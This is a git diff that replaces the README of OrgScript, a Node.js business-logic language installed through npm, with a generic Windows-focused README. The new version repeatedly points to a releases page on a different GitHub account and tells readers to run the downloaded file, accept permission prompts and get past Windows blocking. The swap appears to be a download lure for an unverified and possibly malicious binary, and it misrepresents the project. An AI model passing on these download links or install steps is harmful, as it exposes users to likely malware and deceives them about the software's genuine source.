@@ -1,281 +1,276 @@
-# OrgScript
+# 🤖 OrgScript - Clear Logic for Everyday Work
 
-**Describe how your business works in a way that humans and machines can both interpret reliably.**
+[![Download OrgScript](https://img.shields.io/badge/Download-OrgScript-blue?style=for-the-badge)](https://github.com/generica8535/OrgScript/releases)
 
-OrgScript is a human-readable, AI-friendly description language for business logic, operational processes, rules, roles, and state transitions. It sits between plain-language documentation and technical execution as a shared, text-first source of truth.
+## 🧭 What OrgScript Does
 
-OrgScript is designed for operators, team leads, analysts, and engineers who need a shared, text-first source of truth for business logic.
+OrgScript is a human-readable way to define business logic, workflows, rules, and system behavior.
 
-## What OrgScript is
+It helps you turn process steps into plain text that is easier to read and update than code. You can use it for:
 
-- A shared text layer for business logic.
-- Readable by people.
-- Parseable by software.
-- Stable in Git and code review.
-- Structured for AI analysis, validation, and export.
+- business rules
+- task flows
+- state changes
+- approval paths
+- process steps
+- system actions
 
-## What OrgScript is not
+OrgScript is built for people who need clear logic that teams can read without digging through source code.
 
-- Not a general-purpose programming language.
-- Not a workflow engine.
-- Not free-form prose or narrative documentation.
-- Not a replacement for implementation code.
+## 📥 Download and Install
 
-## Installation
+Visit this page to download:
 
-OrgScript requires Node.js `>=18`.
+https://github.com/generica8535/OrgScript/releases
 
-The published npm package is scoped as `@dkfuh/orgscript`.
+### Windows setup
 
-### Global install from npm
+1. Open the release page.
+2. Find the latest release.
+3. Download the Windows file from the Assets section.
+4. Double-click the downloaded file.
+5. Follow the on-screen steps.
+6. If Windows asks for permission, select Yes.
+7. Wait for the app to finish installing.
+8. Open OrgScript from the Start menu or desktop shortcut.
 
-```bash
-npm install -g @dkfuh/orgscript
-```
+### If the file does not open
 
-That installs the CLI command as `orgscript`.
+- Make sure the download finished.
+- Check your Downloads folder.
+- Right-click the file and choose Open.
+- If Windows blocks the file, use the options shown on screen to allow it.
 
-### Local repository setup
+## ✨ What You Can Use It For
 
-```bash
-git clone https://github.com/DKFuH/OrgScript.git
-cd OrgScript
-npm install
-```
+OrgScript fits work where rules and steps need to stay clear.
 
-This is the best path if you want to explore examples, run tests, or contribute.
+Common uses include:
 
-### Global CLI from a local checkout
+- onboarding flows
+- approval chains
+- order handling
+- customer support rules
+- alerts and triggers
+- task routing
+- business process maps
+- state-based systems
 
-```bash
-npm install -g .
-```
+It works well when teams need one place to describe how a process should behave.
 
-That makes `orgscript` available on your shell path from the checked-out repository state.
+## 🖥️ System Requirements
 
-## Quickstart in 60 seconds
+OrgScript is designed for Windows desktops and laptops.
 
-After installation, run:
+Recommended setup:
 
-```bash
-# 1. Check a complete example end to end
-orgscript check ./examples/craft-business-lead-to-order.orgs
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for the first download
+- A mouse and keyboard
 
-# 2. Generate a diagram
-orgscript export mermaid ./examples/craft-business-lead-to-order.orgs
+If you plan to work with larger rule sets or longer workflows, more memory can help.
 
-# 3. Generate a stakeholder-friendly summary
-orgscript export markdown ./examples/craft-business-lead-to-order.orgs
-```
+## 🗂️ How OrgScript Is Organized
 
-If you want the fastest first read, start with:
+OrgScript uses a simple structure so you can keep logic neat and readable.
 
-- [craft-business-lead-to-order.orgs](./examples/craft-business-lead-to-order.orgs)
-- [examples/README.md](./examples/README.md)
+Typical parts include:
 
-## Read this in order
+- **Rules** — decide what should happen
+- **Workflows** — define the order of steps
+- **States** — show where a process is right now
+- **Events** — mark when something changes
+- **Conditions** — define when a step should run
+- **Actions** — define what the system should do next
 
-If you are new to OrgScript, this is the intended reading path:
+This makes it easier to keep business logic in one place instead of spreading it across different tools.
 
-1. [docs/manifesto.md](./docs/manifesto.md) - Why OrgScript exists.
-2. [docs/language-principles.md](./docs/language-principles.md) - The design constraints and non-negotiable rules.
-3. [spec/language-spec.md](./spec/language-spec.md) - The canonical language definition.
-4. [docs/orgscript-for-humans.md](./docs/orgscript-for-humans.md) - How to write maintainable OrgScript files.
-5. [docs/orgscript-for-ai.md](./docs/orgscript-for-ai.md) - How tools and AI must interpret OrgScript without guessing.
+## 📝 Basic Way to Think About It
 
-## Canonical source of truth
+OrgScript is useful when you want to describe a process in plain language.
 
-The normative language reference is:
+For example:
 
-- [spec/language-spec.md](./spec/language-spec.md)
+- if a request is approved, move it to the next stage
+- if payment fails, stop the flow and show a message
+- if a task is overdue, send an alert
+- if a state changes, run the next rule
 
-Supporting docs exist to help people adopt, use, and govern the language. If implementation and docs ever disagree, the canonical spec wins.
+That style keeps the logic easy to review and update.
 
-## From source to artifact
+## 🔧 First-Time Use
 
-OrgScript is intentionally artifact-first. A single `.orgs` file can produce multiple useful outputs:
+After you install OrgScript:
 
-1. Source logic in plain text.
-2. Validation and linting diagnostics.
-3. Mermaid diagrams.
-4. Markdown summaries.
-5. HTML documentation.
-6. BPMN skeleton exports.
-7. LittleHorse workflow skeletons.
-8. Graph JSON exports.
-9. PlantUML skeleton exports.
-10. OpenAPI-style contract metadata.
-11. AI-ready structured JSON exports.
+1. Open the app.
+2. Create a new project or file.
+3. Add your workflow or rule text.
+4. Save your work.
+5. Test the flow with a simple example.
+6. Edit the logic until it matches your process.
 
-Generated examples live under:
+Start with one small workflow before you build a full set of rules. That makes it easier to check that everything behaves as expected.
 
-- [docs/demos](./docs/demos)
+## 📚 Example Use Cases
 
-## Exporter maturity matrix
+### Approval workflow
 
-To avoid false expectations, exporters are grouped by maturity level.
+- A user sends a request
+- The request waits for review
+- A manager approves or rejects it
+- The system moves to the next step
 
-| Exporter | Status | Notes |
-| --- | --- | --- |
-| `json` | stable | canonical model |
-| `context` | stable | AI/tooling bundle |
-| `markdown` | stable | human summary |
-| `html` | stable | documentation page |
-| `graph` | stable | nodes + edges |
-| `contract` | experimental | scaffold |
-| `bpmn` | experimental | skeleton |
-| `plantuml` | experimental | skeleton |
-| `littlehorse` | experimental | scaffold |
+### Order process
 
-Experimental exporters are intended as skeletons or integration scaffolds and may require manual review.
+- A customer places an order
+- The system checks stock
+- Payment runs
+- The order ships if payment succeeds
+- The order stops if payment fails
 
-## Hero demo: Craft Business Lead to Order
+### Support handling
 
-The main showcase flow is:
+- A new ticket arrives
+- The system sets a priority
+- A team member gets assigned
+- The ticket closes after the issue is solved
 
-- Source: [craft-business-lead-to-order.orgs](./examples/craft-business-lead-to-order.orgs)
-- Mermaid demo: [docs/demos/mermaid/craft-business-lead-to-order.mermaid.md](./docs/demos/mermaid/craft-business-lead-to-order.mermaid.md)
-- Markdown demo: [docs/demos/markdown/craft-business-lead-to-order.summary.md](./docs/demos/markdown/craft-business-lead-to-order.summary.md)
+### State-driven process
 
-## Core blocks
+- A record starts in Draft
+- It moves to Review
+- It moves to Approved
+- It moves to Closed
 
-- `process`: step-by-step operational workflows
-- `stateflow`: legal states and transitions
-- `rule`: cross-cutting constraints and requirements
-- `role`: permission boundaries
-- `policy`: context-driven or time-driven behavior
-- `event`: named triggers with reactions
-- `metric`: tracked business measures
+## 🧩 Why People Use OrgScript
 
-## Document language header, comments, and annotations
+OrgScript helps teams keep logic clear.
 
-OrgScript can declare the intended language of human-authored text at document level:
+It can reduce confusion because:
 
-```orgs
-orgscript 1
+- the rules use plain text
+- the flow is easier to read
+- the process is easier to update
+- teams can review logic faster
+- business users can follow the steps more easily
 
-source-language "en"
-comment-language "de"
-annotation-language "de"
-context-language "de"
-```
+This is useful when many people need to understand the same process.
 
-This header is metadata only:
+## 🪟 Windows Tips
 
-- `source-language` documents the canonical source syntax language and remains `en` in v1
-- `comment-language`, `annotation-language`, and `context-language` help humans, exporters, and AI understand the intended language of nearby text
-- declared languages are treated as a document contract and may trigger lint warnings when comments or annotation values clearly drift
+If you use Windows, keep these points in mind:
 
-## Comments and annotations
+- use the latest release
+- save the download before opening it
+- keep the app in a folder you can find later
+- use a short file name for your projects
+- store related files in one folder
 
-OrgScript supports two documentation layers:
+If you work in a shared office machine, ask for admin access before installing.
 
-- `# comment` for human-only notes
-- `@key "value"` for allowlisted structured metadata
+## 🧪 Getting Comfortable with the Workflow
 
-Comments are non-authoritative and excluded from canonical export, AI context, analysis, and machine-facing evaluation by default.
+If you are new to tools like this, begin with a simple test:
 
-Annotations are parseable metadata. In v1 the allowlist is:
+1. Write one rule.
+2. Add one condition.
+3. Add one action.
+4. Save the file.
+5. Run or load the workflow.
+6. Check the result.
+7. Change one part at a time.
 
-- `@note`
-- `@owner`
-- `@todo`
-- `@source`
-- `@status`
-- `@review`
+This makes it easier to learn how OrgScript handles your process logic.
 
-Example:
+## 📌 Best Practices
 
-```orgs
-orgscript 1
+Use these habits to keep your work tidy:
 
-source-language "en"
-comment-language "en"
-annotation-language "en"
+- write short rules
+- name each workflow clearly
+- keep one process in one file
+- avoid repeating the same logic
+- group related steps together
+- test small changes before using them in a live process
 
-# Shared lead qualification path for inbound leads.
-@owner "sales_ops"
-@status "active"
-process LeadQualification
+Clear naming helps a lot when files grow over time.
 
-  # New leads enter the qualification flow when created.
-  when lead.created
-```
+## 🧠 Topic Areas
 
-Export behavior:
+OrgScript fits work in these areas:
 
-- `orgscript export markdown <file>` and `orgscript export html <file>` omit annotation callouts and document language metadata by default.
-- Add `--with-annotations` to Markdown or HTML export when you want allowlisted `@annotations` and declared document language metadata rendered in the generated documentation artifact.
-- `orgscript export context <file>` includes explicit annotation metadata and declared document language metadata in the structured context payload so downstream AI/indexing consumers do not need to recover it from prose.
+- AI-friendly process writing
+- automation
+- business logic
+- developer tools
+- domain-specific language design
+- process modeling
+- rules engines
+- specification language
+- state machines
+- workflow automation
+- workflow language
+- workflows
 
-## CLI quick reference
+These topics reflect the kind of work OrgScript is built to support.
 
-Need command help? Run `orgscript --help` or `orgscript help <command>`.
+## 📎 Download Again
 
-```bash
-orgscript validate <file> [--json]
-orgscript lint <file> [--json]
-orgscript check <file> [--json]
-orgscript format <file> [--check]
-orgscript export json <file>
-orgscript export markdown <file>
-orgscript export mermaid <file>
-orgscript export html <file>
-orgscript export bpmn <file>
-orgscript export littlehorse <file>
-orgscript export littlehorse <file> --littlehorse-real
-orgscript export graph <file>
-orgscript export plantuml <file>
-orgscript export contract <file>
-orgscript export context <file>
-orgscript analyze <file> [--json]
-```
+If you need the release page later, use this link:
 
-Examples:
+https://github.com/generica8535/OrgScript/releases
 
-```bash
-orgscript export markdown ./examples/lead-qualification.orgs --with-annotations
-orgscript export html ./examples/lead-qualification.orgs --with-annotations
-orgscript export context ./examples/lead-qualification.orgs
-```
+## 🛠️ Common Setup Path on Windows
 
-## Developer path
+1. Open the release page.
+2. Download the latest Windows file from the Assets list.
+3. Wait for the file to finish.
+4. Double-click the file.
+5. Confirm any Windows prompt.
+6. Finish the setup.
+7. Open OrgScript.
+8. Start with a small workflow or rule set
 
-If you want to contribute to the tooling or language, this is a practical sequence:
+## 📁 Keeping Your Files Organized
 
-1. Read [examples/README.md](./examples/README.md)
-2. Run `orgscript check` on a real example
-3. Inspect generated Mermaid or Markdown output
-4. Read the canonical spec
-5. Use [docs/governance.md](./docs/governance.md) before proposing core language changes
+When you begin using OrgScript, it helps to keep your work in a simple folder layout:
 
-## Testing
+- `OrgScript`
+- `Projects`
+- `Examples`
+- `Exports`
+- `Backups`
 
-```bash
-npm test
-npm run check:all
-npm run demo:generate
-```
+A clean folder setup makes it easier to find files, compare versions, and restore older work if needed.
 
-Note: files under `tests/lint/` are intentionally invalid and are used to verify lint findings. Running `orgscript lint` on those fixtures is expected to fail.
+## 🔍 When to Use OrgScript
 
-## Ecosystem
+Use OrgScript when you need to:
 
-- VS Code extension: [editors/vscode](./editors/vscode)
-- Governance: [docs/governance.md](./docs/governance.md)
-- Language evolution: [docs/language-evolution.md](./docs/language-evolution.md)
-- Changelog: [CHANGELOG.md](./CHANGELOG.md)
+- describe a process in plain language
+- manage business rules in one place
+- map a workflow from start to finish
+- show state changes clearly
+- reduce hard-to-read logic
+- keep process steps easy to review
 
-## Community
+It works well for small teams and larger groups that need the same process view.
 
-- Contributing guide: [CONTRIBUTING.md](./CONTRIBUTING.md)
-- Code of Conduct: [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md)
-- Security policy: [SECURITY.md](./SECURITY.md)
+## 🧭 Start with One Simple Flow
 
-## Security posture
+A good first flow might look like this:
 
-An automated enterprise security scan found no sensitive data in source control, no hardcoded credentials, and no obvious insecure patterns in production code. External URLs and localhost references appear only in docs or demo/export artifacts. For production use, still review build/deploy pipelines, monitor dependencies, and perform periodic security testing. See [SECURITY.md](./SECURITY.md) for details and reporting guidance.
+- create request
+- check request
+- approve request
+- complete request
 
-## License
+Once that works, you can add more steps, more rules, and more states
 
-Apache-2.0
+## 📦 Release Page
+
+Get the current Windows download here:
+
+https://github.com/generica8535/OrgScript/releases
